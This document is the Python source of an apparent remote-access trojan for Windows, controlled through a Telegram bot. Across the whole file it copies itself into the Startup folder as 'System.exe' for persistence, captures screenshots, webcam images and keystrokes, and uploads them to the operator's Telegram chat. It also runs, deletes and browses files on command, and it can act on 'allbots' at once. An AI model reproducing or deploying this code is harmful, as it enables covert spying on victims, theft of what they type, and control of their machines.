import urllib.request, json
import time
import requests
import socket
import os 
import pyautogui
import cv2
import shutil
import getpass
import winshell
import webbrowser
import logging
import pynput

commands = []

#Basic bot stuff
TOKEN = ''
CHAT_ID = ''
api_url = f'https://api.telegram.org/bot{TOKEN}/getUpdates'
#Ip address
ip = socket.gethostbyname(socket.gethostname())
bot_name = socket.gethostname()
#Appdata/name
Appdata = os.getenv('APPDATA')


#send message function
def send_message(text):
    url_req = "https://api.telegram.org/bot" + TOKEN + "/sendMessage" + "?chat_id=" +  CHAT_ID + "&text=" + text 
    results = requests.get(url_req)

#list command
def list_command():

    send_message(bot_name + ": " + ip)

#Backdoor function
def backdoor():
    try:
        startup_path = winshell.startup()
        USER_NAME = getpass.getuser()
        path = r"" + startup_path + "\\System.exe"
        file = r"aplikaatio.exe"
        shutil.copyfile(file, path)
        send_message("Backdoor: " + ip  + " " + "sent Successfully!")
    except:
        send_message("Cannot send backdoor!")

#Screenshot fucntion
PHOTO_PATH = f'{Appdata}\Microsoft\Windows\pic.png'
def take_screenshot():
    send_message("Taking screenshot..!")
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(PHOTO_PATH)

    files = {'photo' :open(PHOTO_PATH,'rb')}
    resp = requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto?chat_id={CHAT_ID}",files=files )
    return PHOTO_PATH

#Webcam function
PHOTo_PATH = f'{Appdata}\Microsoft\Windows\webcam.jpg'
def Webcam_Picture():
    try:

        send_message("Taking picture!")
        cap = cv2.VideoCapture(0)
        x = 0
        while x < 10:
            ret, frame = cap.read()
            if x == 4:
                cv2.imwrite(PHOTo_PATH, frame)
            x += 1
        cap.release()
        cv2.destroyAllWindows()

        files = {'photo' :open(PHOTo_PATH,'rb')}
        resp = requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto?chat_id={CHAT_ID}",files=files)
    except:
        send_message("Cannot take webcam picture: " + ip)
#cd ..
def cdMinus():
    os.chdir('..')        
    currentpath = (os.getcwd())
    currentpath = 'cd ..      --→ result\n' + currentpath
    send_message(currentpath)

#cd to directory
def cdTo(dir):
    try:
        os.chdir(dir)
        currentpath = (os.getcwd())
        currentpath = 'cd --→ result\n' + currentpath
        send_message(currentpath)
    except:
        send_message("Error! check command..") 

#Upload file 
def download_file(url):
    # get the file name from the URL
    file_name = url.split("/")[-1]

    # download the file
    response = requests.get(url)
    response.raise_for_status()

    # save the file
    with open(file_name, "wb") as f:
        f.write(response.content)

#Keylogger function
Log_PATH = f'{Appdata}\Microsoft\Windows\keylog.txt'
def keylogger(timma):

    f = open(Log_PATH, "w")

    def on_press(key):
        try:
            key_str = str(key.char)
        except AttributeError:
            key_str = str(key)
            f.write(" ")
        f.write(key_str)
    listener = pynput.keyboard.Listener(on_press=on_press)

    listener.start()
    time.sleep(timma)
    listener.stop()

    f.close()
    with open(Log_PATH, "rb") as f:
        data = f.read()

    endpoint = 'https://api.telegram.org/bot{}/sendDocument'.format(TOKEN)

    requests.post(endpoint, data={'chat_id': CHAT_ID}, files={'document': (f'file: {ip}.txt', data)})
    time.sleep(1)
    os.remove(Log_PATH)

#Main function
def getting_commands():

    with urllib.request.urlopen(api_url) as url:
        data = json.load(url)
        #print(data)
    original_length = str(data)
    original_length = len(original_length)
    ip = socket.gethostbyname(socket.gethostname())

    send_message(bot_name + ": " + ip)
    send_message("Type: '/start'")

    while True:
        time.sleep(2.3)
        
        with urllib.request.urlopen(api_url) as url:
            data = json.load(url)

        data1 = str(data)

        #Checking for ne messages
        lenData = str(data)
        lenData = len(lenData)

        if lenData > original_length:
            original_length = lenData
            
            #Finding command from api
            def find_commands():
                command = []
                count = 0

                for i in data1:
                
                    if i == "/":
                        command.append(count)
                    count += 1

                #Getting last '/' from json data
                command = command[-1]
                data = data1[command:]

                count = 0

                for i in data:
                    if i == "'":
                        data = data[:count]
                        break
                    count += 1

                command = data 
                commands.append(command)
            find_commands()

            WholeCommand = commands[-1]
            command = WholeCommand.split()
            command = command[0]
            #print(WholeCommand)
            print(command)
            
            #Commands!
            match command:
                case "/url":
                    WholeCommand = WholeCommand.split()
                    url = WholeCommand[-1]
                    webbrowser.open(url)
                    send_message("url opened")
                    
                #list command
                case "/list":
                    send_message(bot_name + ": " + ip)
 
                #Screenshot command
                case "/screenshot":
                    #Chck for ip or allbots
                    WholeCommand = WholeCommand.split()
                    print(WholeCommand)
                    
                    if ip in WholeCommand:
                        take_screenshot()
                        os.remove(PHOTO_PATH)
                        
                    elif "allbots" in WholeCommand:
                        take_screenshot()
                        os.remove(PHOTO_PATH)     
                    else:
                        pass

                case "/keylogger":
                    WholeCommand = WholeCommand.split()

                    if ip in WholeCommand:
                        count = WholeCommand[-1]
                        count = int(count)
                        keylogger(count)
            
                    elif "allbots" in WholeCommand:
                        count = WholeCommand[-1]
                        count = int(count)
                        keylogger(count)

                #Webcam command
                case "/webcam":
                    WholeCommand = WholeCommand.split()
                    print(WholeCommand)

                    if ip in WholeCommand:
                        Webcam_Picture()
                        os.remove(PHOTo_PATH)

                    elif "allbots" in WholeCommand:
                        Webcam_Picture()
                        os.remove(PHOTo_PATH)                  

                #shell command
                case "/shell":
                    WholeCommand = WholeCommand.split()
                    print(WholeCommand)

                    if ip in WholeCommand:

                        if WholeCommand[-1] == "ls":
                            path = os.listdir()
                            result = '\n'.join([str(elem) for elem in path])
                            result = 'ls --→ result\n' + result
                            send_message(result)
                        
                        elif "cd" in WholeCommand:

                            if ".." in WholeCommand:
                                cdMinus()
                            else:
                                try:
                                    dir = (WholeCommand[3])
                                    cdTo(dir)
                                except:
                                    pass

                #Run command
                case "/run":
                    WholeCommand = WholeCommand.split()

                    if ip in WholeCommand:
                        try:
                            os.startfile(WholeCommand[2])
                            send_message("File runned!")
                        except:
                            send_message("Cannot open run file")

                #Delete file       
                case "/del":
                    WholeCommand = WholeCommand.split()

                    if ip in WholeCommand:
                        file = WholeCommand[2]
                        os.remove(file)
                      
getting_commands()

